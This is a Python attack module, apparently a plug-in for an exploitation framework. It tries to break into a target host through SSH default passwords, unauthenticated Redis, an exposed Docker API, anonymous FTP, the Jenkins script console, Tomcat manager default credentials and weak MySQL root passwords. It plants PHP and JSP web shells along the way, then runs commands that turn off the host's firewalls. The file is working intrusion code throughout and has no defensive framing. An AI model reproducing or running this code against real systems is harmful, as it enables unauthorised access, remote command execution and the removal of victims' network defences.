import time, socket, requests, paramiko, os, tempfile,sys
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
lib_path = os.path.join(project_root, "lib")
sys.path.insert(0, lib_path)
import threading
from ftplib import FTP
import threading
from colorama import Fore,init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

class Module:
    def __init__(self):
        self.port = None
        self.name = "Firewall Kill"
        self.protocol = "tcp"
        self.url = None
        self.platform = "linux"

    def exploit(self, url=None, lhost=None, timeout=4, verbose=False, **kwargs):
        """尝试所有已知漏洞，成功后自动关闭防火墙"""
        funcs = [
            _exp_ssh_weak,
            _exp_redis_unauth,
            _exp_docker_api,
            _exp_ftp_anonymous,
            _exp_jenkins_script,
            _exp_tomcat_weak,
            _exp_mysql_weak,
        ]

        for func in funcs:
            if func(url, timeout, verbose):
                safe_print(f"{Fore.GREEN}[+] 防火墙已被关闭")
                return True, "防火墙关闭成功"
        if verbose:
            safe_print(f"{Fore.RED}[-] 所有漏洞利用均未成功")
        return False, "防火墙关闭失败"

# ==================== 防火墙关闭命令 ====================
def _disable_firewall(exec_cmd):
    """传入命令执行函数，执行关闭防火墙的命令"""
    cmds = [
        "sudo ufw disable",
        "sudo iptables -P INPUT ACCEPT",
        "sudo iptables -F",
        "sudo systemctl stop firewalld",
        "netsh advfirewall set allprofiles state off",
    ]
    for cmd in cmds:
        try:
            exec_cmd(cmd)
        except:
            safe_print("执行失败")

# ==================== 具体漏洞利用 ====================
def _exp_ssh_weak(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 SSH 弱口令 ... ", end="", flush=True)
    users = [
        ("root","root"), ("root","toor"), ("admin","admin"),
        ("root","password"), ("root","123456"), ("user","user"),
        ("ubuntu","ubuntu"), ("pi","raspberry"), ("kali","kali")
    ]
    for u, p in users:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(url, username=u, password=p, timeout=timeout)
            def cmd_func(cmd):
                ssh.exec_command(cmd)
            _disable_firewall(cmd_func)
            if verbose: safe_print("成功")
            return True
        except:
            continue
    if verbose: safe_print("失败")
    return False

def _exp_redis_unauth(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 Redis 未授权 ... ", end="", flush=True)
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((url, 6379))
        s.send(b"PING\r\n")
        resp = s.recv(1024)
        if b"PONG" not in resp:
            s.close()
            if verbose: safe_print("失败")
            return False
        s.send(b"CONFIG SET dir /var/www/html\r\n")
        time.sleep(0.1)
        s.send(b"CONFIG SET dbfilename shell.php\r\n")
        time.sleep(0.1)
        s.send(b'SET shell "<?php system($_GET[cmd]);?>"\r\n')
        time.sleep(0.1)
        s.send(b"SAVE\r\n")
        s.close()

        url = f"http://{url}/shell.php"
        r = requests.get(url, params={"cmd":"id"}, timeout=timeout, verify=False)
        if "uid=" in r.text:
            def redis_exec(cmd):
                requests.get(url, params={"cmd":cmd}, verify=False)
            _disable_firewall(redis_exec)
            if verbose: safe_print("成功")
            return True
    except:
        pass
    if verbose: safe_print("失败")
    return False

def _exp_docker_api(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 Docker API 未授权 ... ", end="", flush=True)
    try:
        r = requests.get(f"http://{url}:2375/containers/json", timeout=timeout, verify=False)
        if r.status_code != 200:
            if verbose: safe_print("失败")
            return False
        create = requests.post(
            f"http://{url}:2375/containers/create",
            json={
                "Image": "alpine:latest",
                "Cmd": ["sleep", "3600"],
                "HostConfig": {
                    "Binds": ["/:/host"],
                    "Privileged": True,
                    "NetworkMode": "host"
                }
            },
            timeout=timeout
        )
        cid = create.json().get("Id")
        requests.post(f"http://{url}:2375/containers/{cid}/start", timeout=timeout)

        def docker_exec(cmd):
            exec_create = requests.post(
                f"http://{url}:2375/containers/{cid}/exec",
                json={"Cmd": ["sh", "-c", f"chroot /host {cmd}"]},
                timeout=timeout
            )
            eid = exec_create.json().get("Id")
            requests.post(f"http://{url}:2375/exec/{eid}/start", timeout=timeout)

        _disable_firewall(docker_exec)
        if verbose: safe_print("成功")
        return True
    except:
        pass
    if verbose: safe_print("失败")
    return False

def _exp_ftp_anonymous(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 FTP 匿名上传 ... ", end="", flush=True)
    try:
        ftp = FTP()
        ftp.connect(url, 21, timeout=timeout)
        ftp.login()
        dirs = ["/var/www/html", "/var/www", "/html", "/www", "/htdocs"]
        web_dir = None
        for d in dirs:
            try:
                ftp.cwd(d)
                web_dir = d
                break
            except:
                continue
        if not web_dir:
            ftp.quit()
            if verbose: safe_print("失败")
            return False

        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
            f.write('<?php system($_GET["cmd"]);?>')
            tmpname = f.name
        with open(tmpname, 'rb') as f:
            ftp.storbinary('STOR shell.php', f)
        ftp.quit()
        os.unlink(tmpname)

        url = f"http://{url}/shell.php"
        r = requests.get(url, params={"cmd":"id"}, timeout=timeout, verify=False)
        if "uid=" in r.text:
            def ftp_exec(cmd):
                requests.get(url, params={"cmd":cmd}, verify=False)
            _disable_firewall(ftp_exec)
            if verbose: safe_print("成功")
            return True
    except:
        pass
    if verbose: safe_print("失败")
    return False

def _exp_jenkins_script(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 Jenkins 脚本命令行 ... ", end="", flush=True)
    try:
        r = requests.get(f"http://{url}:8080/script", timeout=timeout, verify=False)
        if "Jenkins" not in r.text:
            if verbose: safe_print("失败")
            return False

        def jenkins_exec(cmd):
            script = f'println "{cmd}".execute().text'
            requests.post(
                f"http://{url}:8080/script",
                data={"script": script},
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
        _disable_firewall(jenkins_exec)
        if verbose: safe_print("成功")
        return True
    except:
        pass
    if verbose: safe_print("失败")
    return False

def _exp_tomcat_weak(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 Tomcat 弱口令部署 ... ", end="", flush=True)
    from requests.auth import HTTPBasicAuth
    try:
        r = requests.get(
            f"http://{url}:8080/manager/html",
            auth=HTTPBasicAuth("tomcat", "tomcat"),
            timeout=timeout
        )
        if r.status_code != 200:
            if verbose: safe_print("失败")
            return False

        import io, zipfile
        jsp_code = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>'
        war_buffer = io.BytesIO()
        with zipfile.ZipFile(war_buffer, 'w') as war:
            war.writestr('shell.jsp', jsp_code)
        war_buffer.seek(0)
        deploy_url = f"http://{url}:8080/manager/text/deploy?path=/shell&update=true"
        files = {'file': ('shell.war', war_buffer)}
        requests.post(deploy_url, files=files, auth=HTTPBasicAuth("tomcat","tomcat"))

        shell_url = f"http://{url}:8080/shell/shell.jsp"
        r = requests.get(shell_url, params={"cmd":"id"}, timeout=timeout)
        if "uid=" in r.text or r.status_code == 200:
            def tomcat_exec(cmd):
                requests.get(shell_url, params={"cmd":cmd})
            _disable_firewall(tomcat_exec)
            if verbose: safe_print("成功")
            return True
    except:
        pass
    if verbose: safe_print("失败")
    return False

def _exp_mysql_weak(url, timeout, verbose):
    if verbose: safe_print("[*] 尝试 MySQL 弱口令写Shell ... ", end="", flush=True)
    try:
        import pymysql
        passwords = ["root", "123456", "password", "toor", "mysql", "kali"]
        for pw in passwords:
            try:
                conn = pymysql.connect(host=url, user="root", password=pw, connect_timeout=timeout)
                cur = conn.cursor()
                cur.execute("SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'")
                conn.close()

                url = f"http://{url}/shell.php"
                r = requests.get(url, params={"cmd":"id"}, timeout=timeout, verify=False)
                if "uid=" in r.text:
                    def mysql_exec(cmd):
                        requests.get(url, params={"cmd":cmd}, verify=False)
                    _disable_firewall(mysql_exec)
                    if verbose: safe_print("成功")
                    return True
            except:
                continue
    except ImportError:
        pass
    if verbose: safe_print("失败")
    return False
